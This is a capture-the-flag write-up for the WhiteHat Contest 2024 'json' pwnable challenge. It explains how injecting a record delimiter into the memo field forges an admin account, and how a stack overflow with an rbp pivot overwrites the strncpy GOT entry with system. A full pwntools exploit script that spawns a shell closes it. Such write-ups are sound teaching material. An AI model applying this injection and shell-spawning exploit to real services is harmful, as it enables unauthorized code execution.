+++
title = "WhiteHat Contest 2024 - json"
date = "2024-11-23"
description = "WhiteHat Contest 2024 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "injection", "rop"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/json'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

### Concept
Looking at the `init()` function, each execution creates a `USER_FILE` named `/users/[random string]` to use as a DB file.

Initially, it reads and saves the `user_base.bin` file as-is with the following content.

- `[2|guest|guest|guest memo]`
  - `2` : type
  - 1st `guest` : user
  - 2nd `guest` : pass
  - `guest memo` : memo

Based on this DB file, when `user` and `pass` match, it issues a `token` to create a session and stores that information in the `session` global variable.

### Structure
``` c
struct sess // sizeof=0x40
{
    char user[16];
    char pass[16];
    char *memo;
    __int64 type;
    char token[16];
};
```

Information about issued sessions is stored in this structure format.

### Goal
``` c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
    ...
        else if ( !strcmp((const char *)s, "UpdateMemo") && LOBYTE(session->type) == '1' )
        {
          update_memo();
        }
    ...
}

char *update_memo()
{
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  read(0, buf, 0x100uLL);
  return strncpy((char *)session->memo, buf, 0x100uLL);
}
```

When `type` is `'1'`, we can call `update_memo()`, which has a BOF vulnerability.


## 0x01. Vulnerability
``` c
void __fastcall create_user(__int64 json)
{
  ...
  stream = fopen(USER_FILE, "ab");
  ...
  extract(json, "user", user, 16);
  extract(json, "pass", pass, 16);
  extract(json, "memo", memo, 256);
  if ( *(_BYTE *)user && *(_BYTE *)pass && *(_BYTE *)memo )
  {
    fwrite("[", 1uLL, 1uLL, stream);
    fwrite("2", 1uLL, 1uLL, stream);
    fwrite("|", 1uLL, 1uLL, stream);
    fwrite(user, 1uLL, 0x10uLL, stream);
    fwrite("|", 1uLL, 1uLL, stream);
    fwrite(pass, 1uLL, 0x10uLL, stream);
    fwrite("|", 1uLL, 1uLL, stream);
    fwrite(memo, 1uLL, 0x100uLL, stream);
    fwrite("]\n", 1uLL, 2uLL, stream);
  }
  ...
}
```

`create_user()` allows adding users to `USER_FILE`, but `type` is hardcoded to `'2'`.

However, there's no validation for `memo`, making injection possible.

- `memo` : `AAAA]\n[1|admin|admin|admin memo`

``` text
[2|guest|guest|guest memo]
[2|AAAA|AAAA|AAAA]
[1|admin|admin|admin memo]
```

Calling `create_session()` with `admin/admin` then creates a session with `type` `'1'`.


## 0x02. Exploit
I thought I just needed to perform ROP, but unfortunately there were no gadgets to set arguments.

``` bash
➜  ROPgadget --binary=json | grep rdi
0x0000000000401406 : or dword ptr [rdi + 0x405108], edi ; jmp rax
0x0000000000401c76 : ror byte ptr [rdi], 0x85 ; retf
```

Initially, I tried using registers at the end of `strncpy` in `update_memo()`, but they pointed to the end of `session->memo`, making it impossible to insert arguments like `/bin/sh`.

Thinking that the `system` PLT wasn't there for no reason, I examined `update_memo()` in assembly.

``` text
.text:0000000000402140  endbr64
.text:0000000000402144  push    rbp
.text:0000000000402145  mov     rbp, rsp
.text:0000000000402148  sub     rsp, 10h
.text:000000000040214C  lea     rax, [rbp+buf]
.text:0000000000402150  mov     edx, 100h       ; nbytes
.text:0000000000402155  mov     rsi, rax        ; buf
.text:0000000000402158  mov     edi, 0          ; fd
.text:000000000040215D  call    _read
.text:0000000000402162  mov     rax, cs:session
.text:0000000000402169  mov     rax, [rax+20h]
.text:000000000040216D  lea     rcx, [rbp+buf]
.text:0000000000402171  mov     edx, 100h       ; n
.text:0000000000402176  mov     rsi, rcx        ; src
.text:0000000000402179  mov     rdi, rax        ; dest
.text:000000000040217C  call    _strncpy
.text:0000000000402181  nop
.text:0000000000402182  leave
.text:0000000000402183  retn
```

The `rsi` argument for `read` is set through `rbp`, and since we can control `rbp` through BOF, AAW is also possible.

This made me think of GOT overwrite. Since `strncpy`'s `rdi` is set to `session->memo`, I determined we could execute a shell by placing `/bin/sh` there in advance.

``` python
    read_strncpy_gadget = 0x40214C
    payload = b"/bin/sh\n" * 2
    payload += p64(elf.got['strncpy'] + 0x10)   # rbp
    payload += p64(read_strncpy_gadget)         # ret
    update_memo(s, token, payload)

    sleep(0.5)
    payload = p64(0x4010a0)                     # system
    s.send(payload)
```


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "json"
LIBRARY = "libc.so.6"
CONTAINER = "f0268ff749ca"

code_base = 0x555555554000
bp = {
    'main' : code_base + 0x16ae,
}

gs = f'''
b *update_memo
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def create_session(s, user, pw):
    json = f"{{method:CreateSession,user:{user},pass:{pw}}}"
    s.send(json.encode())
    return s.recvuntil(b"}\n")

def clear_session(s):
    json = f"{{method:ClearSession}}"
    s.send(json.encode())
    return

def create_user(s, token, user, pw, memo):
    json = f"{{token:{token},method:CreateUser,user:{user},pass:{pw},memo:{memo}}}"
    s.send(json.encode())
    return

def check_user(s, token):
    json = f"{{token:{token},method:CheckUser}}"
    s.send(json.encode())
    return s.recvuntil(b"}\n")

def update_memo(s, token, payload):
    json = f"{{token:{token},method:UpdateMemo}}"
    s.send(json.encode())
    pause()
    s.send(payload)
    return

def main(server, port, debug):
    if(port):
        s = remote(server, port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY)
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    token = create_session(s, "guest", "guest").split(b"token:")[1].split(b"}")[0].decode()
    log.info(f"guest token : {token}")

    create_user(s, token, "AAAA", "AAAA", "AAAA]\n[1|admin|admin|admin memo")

    clear_session(s)
    sleep(0.5)

    token = create_session(s, "admin", "admin").split(b"token:")[1].split(b"}")[0].decode()
    log.info(f"admin token : {token}")

    read_strncpy_gadget = 0x40214C
    payload = b"/bin/sh\n" * 2
    payload += p64(elf.got['strncpy'] + 0x10)   # rbp
    payload += p64(read_strncpy_gadget)         # ret
    update_memo(s, token, payload)

    sleep(0.5)
    payload = p64(0x4010a0)                     # system
    s.send(payload)

    s.interactive()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-s', '--server', type=str, default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.server, args.port, args.debug)
```